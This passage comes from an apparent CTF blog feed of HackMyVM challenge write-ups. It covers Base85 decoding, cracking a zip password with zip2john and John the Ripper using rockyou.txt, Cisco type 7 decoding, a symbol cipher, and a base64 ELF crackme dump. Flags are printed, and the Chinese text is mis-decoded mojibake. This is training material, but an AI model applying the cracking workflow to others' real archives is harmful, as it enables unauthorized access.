Ëøô‰∏≤Â≠óÁ¨¶ÂåÖÂê´‰∫ÜÂ§ßÂ∞èÂÜôÂ≠óÊØç„ÄÅÊï∞Â≠ó‰ª•Âèä‰∏Ä‰∫õÁâπÊÆäÁ¨¶Âè∑ (`-`, `.`, `[`, `]`, `/`, `$`, `=`)„ÄÇËøôÁßçÂ≠óÁ¨¶ÈõÜÈÄöÂ∏∏ÊöóÁ§∫‰∫ÜÊüêÁßç Base ÁºñÁ†ÅÔºåÁâπÂà´ÊòØÂ≠óÁ¨¶ÁßçÁ±ªÊØî Base64 Êõ¥ÂπøÔºåÂõ†Ê≠§ÂèØ‰ª•ÂàùÊ≠•ÊÄÄÁñëÊòØ Base85 ÊàñÂÖ∂ÂèòÁßç„ÄÇ

## 2. Ëß£Á†ÅËøáÁ®ã

‰∏∫‰∫ÜËß£ÂºÄËøô‰∏™Â≠óÁ¨¶‰∏≤ÔºåÊàë‰ª¨ÈúÄË¶ÅËØÜÂà´ÂÖ∂ÁºñÁ†ÅÊñπÂºèÂπ∂‰ΩøÁî®Áõ∏Â∫îÁöÑÂ∑•ÂÖ∑ËøõË°åËß£Á†Å„ÄÇ

### 2.1 ÁºñÁ†ÅÂàÜÊûê‰∏éÂ∑•ÂÖ∑ÈÄâÊã©

ËßÇÂØüÂ≠óÁ¨¶‰∏≤ `853-3GB.eOG[ko/A7oS$FF=` ÁöÑÁâπÂæÅÔºö
*   ÂåÖÂê´Êï∞Â≠ó (0-9)
*   ÂåÖÂê´Â§ßÂÜôÂ≠óÊØç (A-Z)
*   ÂåÖÂê´Â∞èÂÜôÂ≠óÊØç (a-z)
*   ÂåÖÂê´ÁâπÊÆäÁ¨¶Âè∑ (`-`, `.`, `[`, `]`, `/`, `$`, `=`)

ËøôÁßçÂπøÊ≥õÁöÑÂ≠óÁ¨¶ÈõÜÔºåÂ∞§ÂÖ∂ÊòØÁâπÊÆäÁ¨¶Âè∑ÁöÑÂá∫Áé∞ÔºåÂº∫ÁÉàÊåáÂêë‰∫Ü Base85 (‰πüÁß∞‰∏∫ Ascii85) ÁºñÁ†Å„ÄÇ

CyberChef ÊòØ‰∏Ä‰∏™ÈùûÂ∏∏Âº∫Â§ßÁöÑÂú®Á∫øÁºñËß£Á†ÅÂ∑•ÂÖ∑ÔºåÊîØÊåÅÂ§öÁßçÁºñÁ†ÅÊ†ºÂºèÔºåÈùûÂ∏∏ÈÄÇÂêàÁî®‰∫éÂ∞ùËØïËß£Á†ÅÊ≠§Á±ªÂ≠óÁ¨¶‰∏≤„ÄÇ

### 2.2 ‰ΩøÁî® CyberChef ËøõË°åËß£Á†Å

Êàë‰ª¨Â∞ÜÂ≠óÁ¨¶‰∏≤Á≤òË¥¥Âà∞ CyberChef ‰∏≠ÔºåÂπ∂Â∫îÁî® 'From Base85' Êìç‰Ωú„ÄÇ

1.  ÊâìÂºÄ CyberChef„ÄÇ
2.  Â∞ÜËæìÂÖ•Â≠óÁ¨¶‰∏≤ `853-3GB.eOG[ko/A7oS$FF=` Á≤òË¥¥Âà∞ 'Input' Ê°Ü‰∏≠„ÄÇ
3.  Âú® 'Operations' ÂàóË°®‰∏≠ÊêúÁ¥¢ 'From Base85' Âπ∂Â∞ÜÂÖ∂ÊãñÊãΩÂà∞ 'Recipe' Âå∫Âüü„ÄÇ

CyberChef ÁöÑÊìç‰ΩúÁïåÈù¢ÂíåÁªìÊûúÂ¶Ç‰∏ãÔºö

![CyberChef Ëß£Á†Å Base85](https://7r1umphk.github.io/image/20250518105917695.webp)

Ëß£Á†ÅÂêéÁöÑËæìÂá∫Âç≥‰∏∫ Flag„ÄÇ

## 3. Flag

‰ªé CyberChef ÁöÑËß£Á†ÅÁªìÊûú‰∏≠ÔºåÊàë‰ª¨Ëé∑Âæó‰∫ÜÊúÄÁªàÁöÑ FlagÔºö

```
HMV{wrtzxcvfdghyt}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20010.html</guid><pubDate>Fri, 27 Jun 2025 09:32:13 +0000</pubDate></item><item><title>Challenge 008</title><link>https://7r1UMPHK.github.io/post/Challenge%20008.html</link><description># Challenge 008

# Challenge 008

**ÊåëÊàòÈìæÊé•:** https://hackmyvm.eu/challenges/challenge.php?c=008

![ÊåëÊàòÂõæÁâá](https://7r1umphk.github.io/image/20250518104404775.webp)

## 1. ÂàùÊ≠•ÂàÜÊûê

ÊåëÊàòÊèê‰æõ‰∫Ü‰∏Ä‰∏™ÂèØ‰∏ãËΩΩÊñá‰ª∂Ôºö`008.zip`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 008.zip      
-rwxr-xr-x 1 kali kali 178 May 17 22:44 008.zip
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 008.zip     
Archive:  008.zip
   skipping: flag.txt                need PK compat. v5.1 (can do v4.6)
```
Êñá‰ª∂ÊòØ‰∏Ä‰∏™ÂæàÂ∞èÁöÑ zip ÂéãÁº©ÂåÖÔºà178 Â≠óËäÇÔºâ„ÄÇÂπ∂‰∏îÂÆÉÂèóÂØÜÁ†Å‰øùÊä§ÔºåÂÜÖÈÉ®ÂåÖÂê´‰∏Ä‰∏™ flag Êñá‰ª∂„ÄÇ

## 2. ÂØÜÁ†ÅÁ†¥Ëß£

‰∏∫‰∫ÜÁ†¥Ëß£ zip Êñá‰ª∂ÁöÑÂØÜÁ†ÅÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî® `zip2john` ÊèêÂèñÂìàÂ∏åÂÄºÔºåÁÑ∂Âêé‰ΩøÁî® `john`ËøõË°åÁ†¥Ëß£„ÄÇ

### 2.1 ÊèêÂèñÂìàÂ∏å

È¶ñÂÖàÔºå‰ΩøÁî® `zip2john` Â∞Ü `008.zip` Êñá‰ª∂ÁöÑÂìàÂ∏åÂÄºÊèêÂèñÂπ∂‰øùÂ≠òÂà∞ `hash` Êñá‰ª∂‰∏≠Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ zip2john 008.zip &gt; hash
```

Êü•Áúã `hash` Êñá‰ª∂ÁöÑÂÜÖÂÆπÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat hash 
008.zip/flag.txt:$zip2$*0*3*0*751e06905814ebe63a63c72e8755d887*d807*e*25e3c7613e997071cd21a2163883*ba4cf18e59493b2515da*$/zip2$:flag.txt:008.zip:008.zip
```
Ëøô‰∏≤Â≠óÁ¨¶Â∞±ÊòØ `john` ÂèØ‰ª•ËØÜÂà´ÁöÑÂìàÂ∏åÊ†ºÂºè„ÄÇ

### 2.2 ‰ΩøÁî® John the Ripper Á†¥Ëß£ÂìàÂ∏å

Êé•‰∏ãÊù•Ôºå‰ΩøÁî® `john` Âíå‰∏Ä‰∏™Â∏∏ËßÅÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏Ôºà‰æãÂ¶Ç `rockyou.txt`ÔºâÊù•Á†¥Ëß£Ëøô‰∏™ÂìàÂ∏åÂÄºÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])
Cost 1 (HMAC size) is 14 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
survivor         (008.zip/flag.txt)     
1g 0:00:00:00 DONE (2025-05-17 22:46) 6.666g/s 218453p/s 218453c/s 218453C/s 123456..eatme1
Use the '--show' option to display all of the cracked passwords reliably
Session completed.
```
‰ªéËæìÂá∫‰∏≠ÂèØ‰ª•ÁúãÂà∞ÔºåÁ†¥Ëß£ÂæóÂà∞ÁöÑÂØÜÁ†ÅÊòØ `survivor`„ÄÇ

## 3. Ëß£ÂéãÊñá‰ª∂Âπ∂Ëé∑Âèñ Flag

ÂæóÂà∞ÂØÜÁ†ÅÂêéÔºåÊàë‰ª¨Â∞ùËØïËß£Âéã `008.zip` Êñá‰ª∂„ÄÇ

Ê†áÂáÜÁöÑ `unzip` ÂëΩ‰ª§ÂèØËÉΩ‰ºöÂõ†‰∏∫ PKWARE ÁâàÊú¨ÂÖºÂÆπÊÄßÈóÆÈ¢òËÄåÂ§±Ë¥•Ôºö
```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 008.zip     
Archive:  008.zip
   skipping: flag.txt                need PK compat. v5.1 (can do v4.6)
```
ÊèêÁ§∫ `need PK compat. v5.1 (can do v4.6)`ÔºåË°®ÊòéÂΩìÂâçÁöÑ `unzip` Â∑•ÂÖ∑ÁâàÊú¨ÂèØËÉΩ‰∏çÂÆåÂÖ®ÊîØÊåÅËØ• zip Êñá‰ª∂ÁöÑÂä†ÂØÜÁâπÊÄß„ÄÇ

Êàë‰ª¨ÂèØ‰ª•ÊîπÁî® `7z` (7-Zip) ÂëΩ‰ª§ËøõË°åËß£ÂéãÔºåÂÆÉÈÄöÂ∏∏ÂÖ∑ÊúâÊõ¥Â•ΩÁöÑÂÖºÂÆπÊÄßÔºö
```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ 7z x 008.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 178 bytes (1 KiB)

Extracting archive: 008.zip
--
Path = 008.zip
Type = zip
Physical Size = 178

Enter password (will not be echoed):
```
Ê≠§Êó∂ÔºåËæìÂÖ•‰πãÂâçÁ†¥Ëß£ÂæóÂà∞ÁöÑÂØÜÁ†Å `survivor`Ôºö
```bash
Enter password (will not be echoed):survivor  # Ê≠§Â§ÑËæìÂÖ•ÂØÜÁ†ÅÔºåÁªàÁ´Ø‰∏çÂõûÊòæ
Everything is Ok

Size:       14
Compressed: 178
```
Ëß£ÂéãÊàêÂäüÂêéÔºå‰ºöÂú®ÂΩìÂâçÁõÆÂΩï‰∏ãÁîüÊàê `flag.txt` Êñá‰ª∂„ÄÇÊü•ÁúãÂÖ∂ÂÜÖÂÆπÔºö
```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat flag.txt 
HMV{cromiphi}
```

## 4. Flag

ÊúÄÁªàÁöÑ Flag ÊòØÔºö
```
HMV{cromiphi}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20008.html</guid><pubDate>Fri, 27 Jun 2025 09:32:09 +0000</pubDate></item><item><title>Challenge 023</title><link>https://7r1UMPHK.github.io/post/Challenge%20023.html</link><description>![image-20250612190323903](https://7r1umphk.github.io/image/202506121903204.webp)

```
022E296D100B1622455D0A16031B130C11
```

cisco type 7

https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html

![image-20250612190738406](https://7r1umphk.github.io/image/202506121907603.webp)

```
HMV{myciscoflag}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20023.html</guid><pubDate>Fri, 27 Jun 2025 09:32:07 +0000</pubDate></item><item><title>Challenge 022</title><link>https://7r1UMPHK.github.io/post/Challenge%20022.html</link><description>![image-20250612185701829](https://7r1umphk.github.io/image/202506121857127.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 022.zip 
-rwxr-xr-x 1 kali kali 197976 Jun 12 06:57 022.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 022.zip 
Archive:  022.zip
 extracting: 022.png                 
                    
```

![022](https://7r1umphk.github.io/image/202506121857563.webp)

https://www.dcode.fr/symbols-ciphers
ÊâìÂºÄÂàóË°®ÊâæÂ∞±ÂÆå‰∫ã‰∫Ü

![image-20250612185931605](https://7r1umphk.github.io/image/202506121859794.webp)

https://www.dcode.fr/birds-on-a-wire-cipher

![image-20250612190245248](https://7r1umphk.github.io/image/202506121902532.webp)

```
BLUEBIRD
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20022.html</guid><pubDate>Fri, 27 Jun 2025 09:32:05 +0000</pubDate></item><item><title>Challenge 021</title><link>https://7r1UMPHK.github.io/post/Challenge%20021.html</link><description>![image-20250612184142389](https://7r1umphk.github.io/image/202506121841690.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 021.zip 
-rwxr-xr-x 1 kali kali 3576 Jun 12 06:41 021.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ 7z x 021.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 3576 bytes (4 KiB)

Extracting archive: 021.zip
--
Path = 021.zip
Type = zip
Physical Size = 3576

Everything is Ok

Size:       21982
Compressed: 3576
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat 21.txt                                                          
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAcBAAAAAAAABAAAAAAAAAAAA3AAAAAAAAAAAAAEAAOAAN
AEAAHwAeAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA
AAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
AAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAGAAAAAAAAsAYAAAAAAAAAEAAA
AAAAAAEAAAAFAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAsQIAAAAAAACxAgAAAAAAAAAQAAAA
AAAAAQAAAAQAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAAAsAQAAAAAAACwBAAAAAAAAABAAAAAA
AAABAAAABgAAANAtAAAAAAAA0D0AAAAAAADQPQAAAAAAAFgCAAAAAAAAYAIAAAAAAAAAEAAAAAAA
AAIAAAAGAAAA4C0AAAAAAADgPQAAAAAAAOA9AAAAAAAA4AEAAAAAAADgAQAAAAAAAAgAAAAAAAAA
BAAAAAQAAAA4AwAAAAAAADgDAAAAAAAAOAMAAAAAAAAgAAAAAAAAACAAAAAAAAAACAAAAAAAAAAE
AAAABAAAAFgDAAAAAAAAWAMAAAAAAABYAwAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAAAFPl
dGQEAAAAOAMAAAAAAAA4AwAAAAAAADgDAAAAAAAAIAAAAAAAAAAgAAAAAAAAAAgAAAAAAAAAUOV0
ZAQAAABUIAAAAAAAAFQgAAAAAAAAVCAAAAAAAAAsAAAAAAAAACwAAAAAAAAABAAAAAAAAABR5XRk
BgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAFLldGQE
AAAA0C0AAAAAAADQPQAAAAAAANA9AAAAAAAAMAIAAAAAAAAwAgAAAAAAAAEAAAAAAAAAL2xpYjY0
L2xkLWxpbnV4LXg4Ni02NC5zby4yAAAAAAAEAAAAEAAAAAUAAABHTlUAAoAAwAQAAAABAAAAAAAA
AAQAAAAUAAAAAwAAAEdOVQCNEdhwtWSejKGgtndxYMH8U/HwUQQAAAAQAAAAAQAAAEdOVQAAAAAA
AwAAAAIAAAAAAAAAAAAAAAIAAAAIAAAAAQAAAAYAAAAAAIEAAAAAAAgAAAAAAAAA0WXObQAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAEgAAAAAAAAAAAAAAAAAAAAAAAABqAAAAIAAAAAAA
AAAAAAAAAAAAAAAAAAAiAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAEgAAAAAAAAAAAAAAAAAA
AAAAAACGAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAApAAAAEgAAAAAAAAAAAAAAAAAAAAAAAACVAAAA
IAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAIgAAAAAAAAAAAAAAAAAAAAAAAAAAX19jeGFfZmluYWxp
emUAX19saWJjX3N0YXJ0X21haW4Ac3RybGVuAF9faXNvYzk5X3NjYW5mAHByaW50ZgBsaWJjLnNv
LjYAR0xJQkNfMi43AEdMSUJDXzIuMi41AEdMSUJDXzIuMzQAX0lUTV9kZXJlZ2lzdGVyVE1DbG9u
ZVRhYmxlAF9fZ21vbl9zdGFydF9fAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAAAAAAgABAAMA
AwABAAQAAQADAAAAAAAAAAEAAwA/AAAAEAAAAAAAAAAXaWkNAAAEAEkAAAAQAAAAdRppCQAAAwBT
AAAAEAAAALSRlgYAAAIAXwAAAAAAAADQPQAAAAAAAAgAAAAAAAAAUBEAAAAAAADYPQAAAAAAAAgA
AAAAAAAAEBEAAAAAAAAgQAAAAAAAAAgAAAAAAAAAIEAAAAAAAADAPwAAAAAAAAYAAAABAAAAAAAA
AAAAAADIPwAAAAAAAAYAAAACAAAAAAAAAAAAAADQPwAAAAAAAAYAAAAFAAAAAAAAAAAAAADYPwAA
AAAAAAYAAAAHAAAAAAAAAAAAAADgPwAAAAAAAAYAAAAIAAAAAAAAAAAAAAAAQAAAAAAAAAcAAAAD
AAAAAAAAAAAAAAAIQAAAAAAAAAcAAAAEAAAAAAAAAAAAAAAQQAAAAAAAAAcAAAAGAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXF
LwAASIXAdAL/0EiDxAjDAAAAAAAAAAAA/zXKLwAA/yXMLwAADx9AAP8lyi8AAGgAAAAA6eD/////
JcIvAABoAQAAAOnQ/////yW6LwAAaAIAAADpwP////8lei8AAGaQAAAAAAAAAAAx7UmJ0V5IieJI
g+TwUFRFMcAxyUiNPc4AAAD/FS8vAAD0Zi4PH4QAAAAAAA8fQABIjT2BLwAASI0Fei8AAEg5+HQV
SIsFDi8AAEiFwHQJ/+APH4AAAAAAww8fgAAAAABIjT1RLwAASI01Si8AAEgp/kiJ8EjB7j9IwfgD
SAHGSNH+dBRIiwXdLgAASIXAdAj/4GYPH0QAAMMPH4AAAAAA8w8e+oA9DS8AAAB1K1VIgz26LgAA
AEiJ5XQMSIs97i4AAOgp////6GT////GBeUuAAABXcMPHwDDDx+AAAAAAPMPHvrpd////1VIieVI
gewgAQAASI0FmQ4AAEiJRejHRfwAAAAAx0X4AQAAAEiNBZAOAABIice4AAAAAOiv/v//SI2F4P7/
/0iJxkiNBYEOAABIice4AAAAAOih/v//SI2F4P7//0iJx+hy/v//SIP4Bg+FxQAAAA+2heD+//88
UHQZSI0FTA4AAEiJx7gAAAAA6Fn+///ptQAAAMdF9AEAAADrNotF9EiYD7aEBeD+//8PvsCD6DAB
RfyLRfRImA+2hAXg/v//D77AjVDQi0X4D6/CiUX4g0X0AYN99AV+xIN9/Bh1QIF9+AAIAAB1Nw+2
heH+//88OHUWSI0F2w0AAEiJx7gAAAAA6OH9///rQEiNBc0NAABIice4AAAAAOjL/f//6ypIjQXE
DQAASInHuAAAAADotf3//+sUSI0FtA0AAEiJx7gAAAAA6J/9//+4AAAAAMnDSIPsCEiDxAjDAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
